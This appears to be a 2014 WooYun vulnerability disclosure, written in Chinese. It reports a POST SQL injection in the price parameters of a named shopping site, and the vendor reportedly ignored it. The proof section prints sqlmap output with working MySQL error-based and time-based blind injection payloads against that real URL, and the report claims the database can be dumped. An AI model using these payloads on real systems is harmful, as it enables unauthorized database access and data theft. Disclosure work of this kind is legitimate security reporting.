wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-04-18：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-06-02：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 存在POST注入 可脱裤。 详细说明：  http://www.yicike.com/9119-Tku/ 此处存在 POST注入 参数 max_price=1&min_price=1   漏洞证明：  ---Place: POSTParameter: max_price    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: max_price=1 AND (SELECT 8955 FROM(SELECT COUNT(*),CONCAT(0x3a6c67693a,(SELECT (CASE WHEN (8955=8955) THEN 1 ELSE 0 END)),0x3a756e643a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&min_price=1Place: POSTParameter: min_price    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: max_price=1&min_price=1 AND (SELECT 4601 FROM(SELECT COUNT(*),CONCAT(0x3a6c67693a,(SELECT (CASE WHEN (4601=4601) THEN 1 ELSE 0 END)),0x3a756e643a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: max_price=1&min_price=1 AND SLEEP(5)---



   修复方案：  自己懂修复。   版权声明：转载请注明来源 Lonely@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
